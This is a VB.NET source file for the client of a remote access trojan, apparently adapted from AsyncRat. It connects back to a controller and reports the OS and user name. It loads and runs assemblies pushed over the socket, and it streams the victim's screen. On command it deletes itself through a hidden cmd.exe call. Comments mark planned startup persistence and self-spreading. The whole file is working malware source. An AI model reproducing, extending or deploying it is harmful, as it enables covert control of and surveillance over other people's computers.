﻿Imports System.Diagnostics
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Windows.Forms
Imports System
Imports System.Drawing
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Principal
Imports System.IO
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
''||       AUTHOR Arsium       ||
''||       github : https://github.com/arsium       ||
Namespace My
    Public Class C
#Region "Global"
        Public Shared TcpV As TcpClient
        Public Shared ViewerDesk As Thread
        'Public Shared ns As NetworkStream
        Public Shared CLI As TcpClient
        ' Public Shared p As StringBuilder
#End Region
#Region "Client Functions"
        Public Shared Sub Check()

            Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes("")
            While True

                Thread.Sleep(1000)

                Try

                    CLI.GetStream.Write(b, 0, b.Length)

                Catch ex As Exception

                    Try
                        CLI = New TcpClient

                        CLI.Connect("127.0.0.1", 8080)

                        Dim hjk As New Thread(Sub() T(CLI.GetStream))
                        hjk.Start()
                    Catch esqx As Exception

                    End Try


                End Try

            End While
        End Sub
        Public Shared Sub Main()

            SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED)

            ''ADD PERMISSION
            ''ADD STARTUP
            ''ADD SPREAD

            Try
                CLI = New TcpClient

                CLI.Connect("127.0.0.1", 8080)

                If CLI.Connected = True Then

                    Dim hjk As New Thread(Sub() T(CLI.GetStream))
                    hjk.Start()



                End If

            Catch ex As Exception

                While CLI.Connected = False


                    Try
                        CLI = New TcpClient

                        CLI.Connect("127.0.0.1", 8080)

                        Dim hjk As New Thread(Sub() T(CLI.GetStream))

                        hjk.Start()

                    Catch exs As Exception

                    End Try
                End While
            End Try
            Dim zeo As New Thread(Sub() Check())
            zeo.Start()


        End Sub
        Public Shared P As StringBuilder
        Public Shared Async Sub T(ByVal l As NetworkStream)

            p = New StringBuilder

            Try
                Dim b(150 * 4096) As Byte


                While True


                    Dim lu As Integer = l.Read(b, 0, b.Length)
                    If (lu > 0) Then


                        Try
                            Dim Message As String = Encoding.Default.GetString(b, 0, lu)


                            P.Append(Message)


                            If P.ToString.EndsWith("|GETID|") Then
                                Dim Info As New Microsoft.VisualBasic.Devices.Computer
                                Dim ks As String = Info.Info.OSFullName & "|IDD|" & Environment.UserName & "|IDD|" & Info.Info.OSVersion & "|IDDEND|"

                                CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)

                                P.Clear()

                            ElseIf P.ToString.EndsWith("|ENDING|") Then

                                Dim j As String = Message.Replace("|ENDING|", "")

                                P.Clear()

                                '            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
                                Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")


                                Dim az As New Thread(Sub() Launch(CLI, j2(0), j2(1)))
                                az.Start()



                                GC.Collect()
                                GC.WaitForPendingFinalizers()
                                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                                EmptyWorkingSet(Process.GetCurrentProcess.Handle)

                            ElseIf P.ToString = "|CLOSETHISSHIT|" Then



                                Microsoft.VisualBasic.Interaction.Shell("cmd.exe /c ping 0 -n 2 & del " & """" & System.Windows.Forms.Application.ExecutablePath & """", Microsoft.VisualBasic.AppWinStyle.Hide, False, -1)
                                NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)


                            ElseIf P.ToString = "|CLOSEONLY|" Then
                                NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
                                ' Environment.Exit(0)


                            ElseIf P.ToString.EndsWith("|SRDV|") Then


                                P.Clear()

                                TcpV = New TcpClient

                                TcpV.Connect("127.0.0.1", 8081)



                                ViewerDesk = New Thread(AddressOf CamCam)

                                ViewerDesk.Start()


                            ElseIf P.ToString.EndsWith("|TRDV|") Then

                                P.Clear()

                                Try
                                    ViewerDesk.Abort()
                                Catch ex As Exception

                                End Try

                            End If


                        Catch ex As Exception

                        End Try



                    Else

                    End If
                    GC.Collect()
                    GC.WaitForPendingFinalizers()
                    SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                    EmptyWorkingSet(Process.GetCurrentProcess.Handle)
                End While
            Catch ex As Exception
                Exit Sub
            End Try
        End Sub














        Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal mp As String, Optional ByVal P As String = "")

            Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(Encoding.Default.GetBytes(mp))

            Dim method As System.Reflection.MethodInfo = assemblytoload.[GetType]("PL.MainCL").GetMethod("ST")

            Dim obj As Object = assemblytoload.CreateInstance(method.Name)

            Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))

            assemblytoload = Nothing

            method = Nothing

            GC.Collect()
            GC.WaitForPendingFinalizers()
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
        End Sub
#End Region
#Region "RemoteViewer"


        Public Shared Function Desk() As Image

            Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize

            Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
            'Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)

            Dim graphics As Graphics = Graphics.FromImage(iamage)

            graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed


            graphics.CopyFromScreen(0, 0, 0, 0, primaryMonitorSize)

            ''this code is always the same to get "screenshot" but it doesn't include cursor so I made a way to get it !

            Dim P As New Point

            GetCursorPos(P)

            Dim hj As New CURSORINFOHELPER

            hj.cbSize = Marshal.SizeOf(hj)

            GetCursorInfo(hj)

            If hj.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
                '
                graphics.DrawIcon(Icon.FromHandle(hj.hCursor), P.X, P.Y)

            End If

            graphics.Dispose()

            ''Based On the vbnet version of AsyncRat (code below)


            Dim o As Integer = (primaryMonitorSize.Width / 100) * 80

            Dim o2 As Integer = (primaryMonitorSize.Height / 100) * 80

            Dim Resize As New Bitmap(o, o2)

            Dim g2 As Graphics = Graphics.FromImage(Resize)

            g2.CompositingQuality = CompositingQuality.HighSpeed

            g2.DrawImage(iamage, New Rectangle(0, 0, o, o2), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

            Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 75)

            Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)

            Dim encoderParameters As EncoderParameters = New EncoderParameters(1)

            encoderParameters.Param(0) = encoderParameter

            Dim MS As New IO.MemoryStream

            Resize.Save(MS, encoderInfo, encoderParameters)

            Return Image.FromStream(MS)
        End Function
        ''Async Rat VBnet Version Function 
        Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As ImageCodecInfo
                encoders = ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function


        Public Shared Sub CamCam()
            Dim bf As New BinaryFormatter

            While True

                '  Dim p As New MemoryStream

                ' Desk.Save(p, Desk.RawFormat)

                ' Dim o As String = "|R|" & Encoding.Default.GetString(p.ToArray)
                ' Dim mp As Byte() = Encoding.Default.GetBytes(o)

                ' ns.WriteAsync(mp, 0, mp.Length)
                bf.Serialize(TcpV.GetStream, Desk)


                GC.Collect()
                GC.WaitForPendingFinalizers()


                Thread.Sleep(1)

                '
                GC.Collect()
                GC.WaitForPendingFinalizers()
                EmptyWorkingSet(Process.GetCurrentProcess.Handle)
            End While
        End Sub
#End Region
#Region "NativeAPI"
        Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

        <DllImport("ntdll.dll")>
        Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger

        End Function

        <DllImport("psapi")>
        Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean

        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE

        End Function

        Public Enum EXECUTION_STATE As UInteger

            ES_CONTINUOUS = &H80000000UI

            ES_DISPLAY_REQUIRED = &H2

            ES_SYSTEM_REQUIRED = &H1

        End Enum

        <DllImport("user32.dll")>
        Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean

        End Function

        <DllImport("user32.dll")>
        Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean

        End Function

        <StructLayout(LayoutKind.Sequential)>
        Structure CURSORINFOHELPER

            Public cbSize As Int32

            Public flags As Int32

            Public hCursor As IntPtr

            Public ptScreenPos As Point

        End Structure

#End Region

    End Class
End Namespace